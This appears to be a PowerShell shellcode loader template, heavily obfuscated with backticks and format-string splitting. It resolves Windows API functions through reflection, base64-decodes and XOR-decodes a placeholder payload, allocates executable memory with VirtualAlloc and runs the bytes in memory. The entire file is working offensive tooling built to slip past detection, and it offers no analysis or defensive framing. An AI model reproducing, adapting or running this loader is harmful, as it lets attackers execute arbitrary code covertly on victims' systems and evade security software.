s`eT-`Str`ic`TmODE -Version 2

function f`U`N`c_G`et_proc`_`ADDrESS {
	Param (${v`AR_mO`Dule}, ${Var_`PR`OCeDurE})		
	${VAR_Unsaf`E_NaTIV`E`_M`ETH`ODs} = ([AppDomain]::"cU`RRENt`DOMa`In".("{1}{0}{2}"-f'emb','GetAss','lies').Invoke() | Whe`RE-`OB`jeCT { ${_}."gLo`BaLasS`eMbLy`C`ACHE" -And ${_}."LOc`A`TION".("{0}{1}"-f'Spl','it').Invoke('\\')[-1].("{0}{1}{2}" -f'Equ','al','s').Invoke(("{2}{0}{1}" -f 't','em.dll','Sys')) }).("{1}{0}"-f 'etType','G').Invoke(("{0}{6}{8}{1}{3}{4}{7}{5}{2}"-f'Mi','in32.U','hods','nsaf','eN','t','crosof','ativeMe','t.W'))
	${VAR`_gpa} = ${VAr_un`sAFe`_n`Ative_`METhOds}.("{2}{0}{1}" -f 'etho','d','GetM').Invoke(("{3}{1}{0}{2}{4}"-f 'tPr','e','ocAd','G','dress'), [Type[]] @(("{4}{6}{8}{5}{0}{1}{3}{2}{7}"-f 'e.Inte','ropServi','andle','ces.H','Syst','Runtim','em','Ref','.'), ("{1}{0}"-f'ng','stri')))
	return ${vA`R_G`Pa}."iN`VOKe"(${N`Ull}, @([System.Runtime.InteropServices.HandleRef](nE`W-`oBjECT ('Sys'+'tem.'+'R'+'un'+'ti'+'me.In'+'tero'+'pS'+'ervices.Handle'+'Ref')((neW`-`O`BJect ('Int'+'Ptr')), (${V`AR_unSAf`E_n`At`ive_M`eTHO`ds}.("{0}{2}{1}" -f'G','ethod','etM').Invoke(("{4}{3}{2}{1}{0}" -f'e','l','ModuleHand','t','Ge')))."iN`V`Oke"(${Nu`ll}, @(${VaR_`M`oduLE})))), ${Va`R_`prOCeDuRE}))
}

function func_`geT_dElEg`A`TE_T`yPE {
	Param (
		[Parameter(pOsiTion = 0, MANdATOry = ${TR`UE})] [Type[]] ${VAR_`p`Ar`AmEteRS},
		[Parameter(PosItiOn = 1)] [Type] ${Va`R_rEtURn`_`TYpE} = [Void]
	)

	${Va`R_t`Y`pe_BUildeR} = [AppDomain]::"cU`RRe`NtDO`mAin".("{1}{3}{2}{0}" -f'Assembly','D','mic','efineDyna').Invoke((NEW-`ObJE`CT ('System'+'.'+'Re'+'flect'+'i'+'on.As'+'semblyName')(("{3}{2}{0}{1}" -f'te','dDelegate','eflec','R'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"r`Un").("{4}{3}{0}{2}{1}" -f'Dyna','cModule','mi','fine','De').Invoke(("{3}{0}{2}{1}" -f'nM','odule','emoryM','I'), ${fal`SE}).("{1}{0}{2}"-f 'ineT','Def','ype').Invoke(("{0}{1}{2}" -f'My','DelegateTy','pe'), ("{1}{3}{5}{7}{8}{0}{4}{2}{6}{9}" -f 'blic','Clas','Cla','s',', Sealed, Ansi',', ','ss,','P','u',' AutoClass'), [System.MulticastDelegate])
	${vAr`_ty`pe_bu`ILDER}.("{3}{1}{2}{0}" -f 'or','ineConst','ruct','Def').Invoke(("{6}{0}{4}{5}{2}{3}{1}"-f 'Speci','eBySig, Public','Hi','d','alNa','me, ','RT'), [System.Reflection.CallingConventions]::"S`Tand`ArD", ${vA`R_Pa`Ra`MetErs}).("{1}{3}{4}{0}{2}" -f'on','Set','Flags','Implementat','i').Invoke(("{0}{2}{3}{1}" -f'R','aged','unt','ime, Man'))
	${vAR_`TYP`E`_BuILder}.("{0}{3}{2}{1}" -f'Defin','hod','et','eM').Invoke('Invoke', ("{9}{5}{3}{0}{4}{6}{10}{1}{8}{2}{7}"-f 'ySi','ew','rt','eB','g,','lic, Hid',' ','ual','Slot, Vi','Pub','N'), ${vA`R_RETur`N_t`YPE}, ${var_p`AR`Am`eTERS}).("{0}{4}{1}{2}{3}" -f 'S','Impl','ementationF','lags','et').Invoke(("{4}{0}{3}{2}{1}" -f'unti','d',' Manage','me,','R'))

	return ${vA`R_`Type_`BuildeR}.("{2}{1}{0}"-f'ype','teT','Crea').Invoke()
}

If ([IntPtr]::"s`iZE" -eq 8) {
	[Byte[]]${va`R`_`CoDe} = [System.Convert]::("{3}{0}{2}{4}{1}"-f 'B','ing','ase','From','64Str').Invoke('%%DATA%%')

	for (${X} = 0; ${x} -lt ${VAr`_cOde}."Co`UNT"; ${x}++) {
		${VA`R`_CodE}[${X}] = ${V`Ar_`cOdE}[${X}] -bxor 42
	}

	${V`AR_`Va} = [System.Runtime.InteropServices.Marshal]::("{5}{3}{6}{4}{1}{2}{0}"-f'nter','nct','ionPoi','ele','ForFu','GetD','gate').Invoke((fUnc_GeT_`p`Roc_A`D`d`Ress ('kern'+'el32.d'+'l'+'l') ('V'+'ir'+'tualA'+'lloc')), (fuNc_G`e`T_d`E`l`EGate_typE @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	${vA`R`_Buf`FEr} = ${vaR_`VA}."iNv`O`ke"([IntPtr]::"z`ErO", ${v`Ar_Code}."l`E`NGTH", 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::("{1}{0}"-f 'py','Co').Invoke(${v`AR_C`oDE}, 0, ${V`AR_BU`FF`Er}, ${va`R`_code}."le`NGTh")

	${V`Ar_ru`N`me} = [System.Runtime.InteropServices.Marshal]::"getDe`lE`g`AtEf`OR`FuNCtIonpOint`Er"(${v`AR_BuF`FER}, (f`Unc_G`ET_DElE`GaTe_`Type @([IntPtr]) ([Void])))
	${v`Ar_Ru`N`ME}."iN`Voke"([IntPtr]::"Ze`RO")
}

